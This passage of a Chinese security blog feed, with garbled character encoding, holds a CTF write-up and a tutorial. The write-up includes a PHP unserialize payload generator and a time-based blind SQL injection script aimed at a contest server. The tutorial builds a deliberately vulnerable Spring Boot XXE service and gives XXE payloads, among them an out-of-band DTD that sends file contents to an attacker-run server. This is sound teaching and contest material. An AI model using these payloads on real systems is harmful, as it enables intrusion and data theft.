class="comment">//baby object</span></span><br><span class="line"><span class="keyword">echo</span> $Input_data;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"baby"</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">"%00*%00skyobj"</span>;O:<span class="number">4</span>:<span class="string">"cool"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"filename"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;s:<span class="number">4</span>:<span class="string">"nice"</span>;N;s:<span class="number">6</span>:<span class="string">"amzing"</span>;N;&#125;s:<span class="number">3</span>:<span class="string">"aaa"</span>;N;s:<span class="number">3</span>:<span class="string">"bbb"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>åŸå…ˆæˆ‘ä»¥ä¸ºcoolé‡Œé¢è¿˜è¦å†ç”Ÿæˆä¸€ä¸ªbabyå¯¹è±¡ç»•è¿‡<code>if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code>ï¼Œä½†ç›´æ¥å°†ä¸Šé¢çš„payloadä½œä¸ºgetçš„dataå‘è¿‡å»å°±èƒ½æ‹¿åˆ°flagäº†ï¼ŒåŸå› æ˜¯<code>$this-&gt;nice = unserialize($this-&gt;amzing);</code>æ‰§è¡Œå<code>$nice=bool(false)</code>ï¼Œæ­¤æ—¶<code>$this-&gt;nice-&gt;aaa=$this-&gt;nice-&gt;bbb=NULL</code>ï¼Œå› ä¸º<code>$sth</code>å˜é‡æ²¡æœ‰å®šä¹‰ï¼ˆå®é™…ä¸Šåœ¨<code>flag.php</code>ä¸­<code>$sth</code>æ˜¯å®šä¹‰çš„ï¼Œä½†æ˜¯åœ¨ç±»ä¸­ä¸èƒ½ç›´æ¥ç”¨â€”â€”éœ€è¦globalå£°æ˜ï¼‰ï¼Œå› æ­¤å³ä½¿æ‰§è¡Œ<code>$this-&gt;nice-&gt;aaa = $sth;</code>ï¼Œ<code>$this-&gt;nice-&gt;aaa</code>ä»ä¸ºç©ºï¼Œå› æ­¤ifåˆ¤æ–­æ˜¯é€šè¿‡çš„ã€‚</p><p><img src="/ctf-2019å®‰æ’01æœˆèµ›babygoï¼ˆè¯¦è§£ï¼‰å’Œå…¶ä»–é¢˜ç›®wp/TIMæˆªå›¾20190126112049.png" alt="TIMæˆªå›¾20190126112049"></p><h2 id="æ­£ç¡®è§£æ³•"><a href="#æ­£ç¡®è§£æ³•" class="headerlink" title="æ­£ç¡®è§£æ³•"></a>æ­£ç¡®è§£æ³•</h2><p>å¦‚æœåœ¨ç±»ä¸­ç¡®å®ä½¿ç”¨äº†globalå£°æ˜ï¼Œé‚£ä¹ˆéœ€è¦ç”¨æŒ‡é’ˆä½¿bbbéšaaaåŠ¨æ€æ”¹å˜ï¼ˆè¿™åº”è¯¥æ˜¯å‡ºé¢˜äººæœ¬æ¥çš„æ„æ€ï¼Œæ„Ÿè°¢é£˜é›¶å¤§ä½¬çš„wp)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b=<span class="keyword">new</span> baby();</span><br><span class="line">$b-&gt;bbb=&amp;$b-&gt;aaa;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æ¢³ç†ä¸€ä¸‹æˆ‘ä»¬çš„å¯¹è±¡å…³ç³»ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$baby_outside-&gt;skyobj=$cool_obj</span><br><span class="line">$cool_obj-&gt;amzing=serialize($baby_inside)</span><br><span class="line">$baby_inside-&gt;bbb=&amp;$baby_inside-&gt;aaa</span><br></pre></td></tr></table></figure><p>è¿™æ ·å› ä¸ºæœ€å†…éƒ¨çš„baby-&gt;skyobjä¸èƒ½ä¸ºcoolå¯¹è±¡ï¼Œä¸ç„¶å°±å¾ªç¯è°ƒç”¨äº†ï¼Œå› æ­¤è¦å¤„ç†ä¸€ä¸‹æ„é€ å‡½æ•°ï¼Œpayloadäº§ç”Ÿä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($s)&#123;</span><br><span class="line">            <span class="comment">//è‹¥ä¸ºå†…éƒ¨åˆ™åŒ…å«secå¯¹è±¡ï¼Œä¸”ä½¿ç”¨æŒ‡é’ˆ</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bbb=&amp;<span class="keyword">$this</span>-&gt;aaa; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;skyobj=<span class="keyword">new</span> sec();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//è‹¥ä¸ºå¤–éƒ¨åˆ™æ„é€ ä¸€ä¸ªcoolå¯¹è±¡ï¼Œ</span></span><br><span class="line">            $c=<span class="keyword">new</span> cool();</span><br><span class="line">            $c-&gt;filename=<span class="string">"flag.php"</span>;</span><br><span class="line">            $b=<span class="keyword">new</span> baby(<span class="string">'i'</span>);</span><br><span class="line">            $c-&gt;amzing=serialize($b);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;skyobj = $c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $nice; <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">public</span> $amzing;  <span class="comment">//baby object serialized</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $bb_ser;</span></span><br><span class="line">$b=<span class="keyword">new</span> baby();</span><br><span class="line">$b_ser=serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b_ser);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$Input_data = unserialize($b_ser); <span class="comment">//baby object</span></span><br><span class="line"><span class="keyword">echo</span> $Input_data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A71%3A%22O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22sec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å¤ç°æˆåŠŸï¼š</p><p><img src="/ctf-2019å®‰æ’01æœˆèµ›babygoï¼ˆè¯¦è§£ï¼‰å’Œå…¶ä»–é¢˜ç›®wp/1548595054319.png" alt="1548595054319"></p><h1 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h1><p>ä½¿ç”¨formostå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼š</p><p><img src="/ctf-2019å®‰æ’01æœˆèµ›babygoï¼ˆè¯¦è§£ï¼‰å’Œå…¶ä»–é¢˜ç›®wp/00005806.jpg" alt="00005806"></p><p>å·¦ä¸‹è§’æœ‰ä¸ªå¾ˆæ·¡çš„flagï¼Œç”¨stegsolveå°±çœ‹çš„å¾ˆæ¸…æ¥šäº†ï¼š</p><p><img src="/ctf-2019å®‰æ’01æœˆèµ›babygoï¼ˆè¯¦è§£ï¼‰å’Œå…¶ä»–é¢˜ç›®wp/TIMæˆªå›¾20190126194212.png" alt="TIMæˆªå›¾20190126194212"></p><h1 id="å…¶ä»–é¢˜ç›®è®°å½•"><a href="#å…¶ä»–é¢˜ç›®è®°å½•" class="headerlink" title="å…¶ä»–é¢˜ç›®è®°å½•"></a>å…¶ä»–é¢˜ç›®è®°å½•</h1><h2 id="Reverse1"><a href="#Reverse1" class="headerlink" title="Reverse1"></a>Reverse1</h2><p>é¢˜ç›®ç»™çš„pycåç¼–è¯‘ä¸äº†ï¼Œäºæ˜¯ä½¿ç”¨pyinstxtractor.pyåç¼–è¯‘exeï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå› ä¸ºæ–‡ä»¶å¤ªå¤šå½“æ—¶å°±å¡ä½äº†ï¼Œå®é™…ä¸Šåº”è¯¥ä¿®å¤<code>AnhengRe</code>æ–‡ä»¶çš„å¤´éƒ¨ï¼Œå¹¶åŠ ä¸Špycçš„åç¼€ï¼Œå°±å¯ä»¥åç¼–è¯‘å‡ºæºä»£ç äº†ã€‚</p><h2 id="é”®ç›˜ä¹‹äº‰"><a href="#é”®ç›˜ä¹‹äº‰" class="headerlink" title="é”®ç›˜ä¹‹äº‰"></a>é”®ç›˜ä¹‹äº‰</h2><p>å°†å­—ç¬¦ä¸²ä»QWERYé”®ç›˜çš„å¸ƒå±€å¯¹åº”åˆ°Dvorakçš„å¸ƒå±€å°±å¯ä»¥å¾—åˆ°flagï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¤å…¸å¯†ç æœ¬ã€‚</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>å‚è€ƒ<a href="https://www.anquanke.com/post/id/170341#h3-3" target="_blank" rel="noopener">é£˜é›¶å¤§ä½¬wp</a>,ä¸ºtp3.2çš„çº¦æŸæ³¨å…¥ï¼Œé™„ä¸Šexpä¾›ä»¥åä½¿ç”¨ï¼š</p><p>æŸ¥çœ‹è¡¨ã€åˆ—åpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)--</span><br></pre></td></tr></table></figure><p>ç›²æ³¨expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'re4g49sil8hfh4ovfrk7ln1o02'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>,cookies=cookies)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®ç°åŒ…å«XXEæ¼æ´çš„æœåŠ¡ã€æ”»å‡»ä»¥åŠé˜²å¾¡æ–¹æ³•</title>
      <link href="/xxe-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/"/>
      <url>/xxe-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="å®ç°åŒ…å«XXEæ¼æ´çš„æœåŠ¡"><a href="#å®ç°åŒ…å«XXEæ¼æ´çš„æœåŠ¡" class="headerlink" title="å®ç°åŒ…å«XXEæ¼æ´çš„æœåŠ¡"></a>å®ç°åŒ…å«XXEæ¼æ´çš„æœåŠ¡</h1><h2 id="æ–°å»ºé¡¹ç›®"><a href="#æ–°å»ºé¡¹ç›®" class="headerlink" title="æ–°å»ºé¡¹ç›®"></a>æ–°å»ºé¡¹ç›®</h2><p>é¦–å…ˆå®ç°ä¸€ä¸ªåŒ…å«XXEæ¼æ´çš„æœåŠ¡å§ï¼Œæ–°å»ºä¸€ä¸ªSpringBooté¡¹ç›®ï¼š<br><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548150750904.png" alt="1548150750904"></p><p>å»ºå¥½ä¹‹åç›®å½•å¦‚ä¸‹</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548154022764.png" alt="1548154022764"></p><h2 id="å®šä¹‰Controller"><a href="#å®šä¹‰Controller" class="headerlink" title="å®šä¹‰Controller"></a>å®šä¹‰Controller</h2><p>æ–°å»ºXXEController.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XXEController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(value = <span class="string">"/xxe"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xxe</span><span class="params">(@RequestBody String userString)</span> <span class="keyword">throws</span> ParserConfigurationException, IOException, SAXException </span>&#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        Document doc = db.parse(<span class="keyword">new</span> ByteArrayInputStream(userString.getBytes(<span class="string">"utf-8"</span>)));</span><br><span class="line">        String username = getValueByTagName(doc, <span class="string">"username"</span>);</span><br><span class="line">        String password = getValueByTagName(doc, <span class="string">"password"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Username: "</span> + username + <span class="string">"Password: "</span> + password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getValueByTagName</span><span class="params">(Document doc, String tagName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (doc == <span class="keyword">null</span> || tagName.equals(<span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        NodeList pl = doc.getElementsByTagName(tagName);</span><br><span class="line">        <span class="keyword">if</span> (pl != <span class="keyword">null</span> &amp;&amp; pl.getLength() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pl.item(<span class="number">0</span>).getTextContent();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>ä»¥ä¸Šä¸€ä¸ªè„†å¼±çš„æœåŠ¡å™¨å°±åšå¥½äº†ï¼Œç”¨postmanå‘ä¸ªåŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿”å›äº†æœŸå¾…å†…å®¹ï¼š</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548159244547.png" alt="1548159244547"></p><h1 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h1><h2 id="æœ‰å›æ˜¾çš„XXEæ”»å‡»"><a href="#æœ‰å›æ˜¾çš„XXEæ”»å‡»" class="headerlink" title="æœ‰å›æ˜¾çš„XXEæ”»å‡»"></a>æœ‰å›æ˜¾çš„XXEæ”»å‡»</h2><p>æ–°å»º<code>d:/flag/flag.txt</code>æ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>flag:1234</code></p><p>é€šè¿‡å¤–éƒ¨å®ä½“æ„é€ Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///d:/flag/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;passw0rd&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°flag.txtå†…å®¹å·²ç»è¢«æ‰“å°ï¼š</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548159377847.png" alt="1548159377847"></p><h2 id="æ— å›æ˜¾çš„XXEæ”»å‡»"><a href="#æ— å›æ˜¾çš„XXEæ”»å‡»" class="headerlink" title="æ— å›æ˜¾çš„XXEæ”»å‡»"></a>æ— å›æ˜¾çš„XXEæ”»å‡»</h2><p>æ”»å‡»è€…åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ„é€ <code>evil.dtd</code>ï¼Œå¹¶å¼€å¯httpæœåŠ¡ï¼ˆè¿™é‡Œå‡è®¾ä¸º127.0.0.1:8000ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://127.0.0.1:8000/%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%payload;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p>å†ç»™é¶æœºå‘é€å¦‚ä¸‹payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///d:/flag/flag.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:8000/evil.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>å‘åŒ…ï¼Œçœ‹åˆ°æœåŠ¡å™¨æŠ¥é”™ï¼š</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548210905577.png" alt="1548210905577"></p><p>åŒæ—¶åœ¨æ”»å‡»æœºä¸Šå¯ä»¥çœ‹åˆ°æ–‡ä»¶å†…å®¹ï¼š</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548160653404.png" alt="1548160653404"></p><h2 id="ä½¿ç”¨ftpè¿›è¡Œæ— å›æ˜¾çš„æ”»å‡»"><a href="#ä½¿ç”¨ftpè¿›è¡Œæ— å›æ˜¾çš„æ”»å‡»" class="headerlink" title="ä½¿ç”¨ftpè¿›è¡Œæ— å›æ˜¾çš„æ”»å‡»"></a>ä½¿ç”¨ftpè¿›è¡Œæ— å›æ˜¾çš„æ”»å‡»</h2><p>ä½¿ç”¨ftpçš„å¥½å¤„æ˜¯è‹¥æœåŠ¡æ˜¯javaå†™çš„å¯ä»¥åˆ—ç›®å½•å’Œè·å–å¤šè¡Œæ–‡ä»¶ï¼ˆä½†æ˜¯æˆ‘è¿™é‡Œåœ¨winå’Œlinuxä¸Šéƒ½æ²¡æœ‰å¤ç°æˆåŠŸï¼Œæ€€ç–‘æ˜¯javaåº“çš„ç‰ˆæœ¬é—®é¢˜ï¼‰ã€‚</p><p>ä½¿ç”¨<code>mvn clean package</code>æ‰“åŒ…å‡ºjar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Î» mvn clean package</span><br><span class="line">[WARNING]</span><br><span class="line">[WARNING] Some problems were encountered <span class="keyword">while</span> building the effective settings</span><br><span class="line">[WARNING] expected START_TAG or END_TAG not TEXT (position: TEXT seen ...&lt;/repositories&gt;\n\u3000\u3000\u3000 &lt;!-- \u63d2\u4ef6\u4ed3\u5e93 --&gt;\n      &lt;p... @232:9)  @ D:\Store\document\all_my_work\java_lib\apache-maven-3.5.0\bin\..\conf\settings.xml, line 232, column 9</span><br><span class="line">[WARNING]</span><br><span class="line">[INFO] Scanning <span class="keyword">for</span> projects...</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Building xxedemo 0.0.1-SNAPSHOT</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: 10.617 s</span><br><span class="line">[INFO] Finished at: 2019-01-23T14:19:30+08:00</span><br><span class="line">[INFO] Final Memory: 37M/324M</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸Šå¯åŠ¨æ¼æ´æœåŠ¡å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target/xxedemo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>å‡†å¤‡è„šæœ¬<code>xxeftp.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 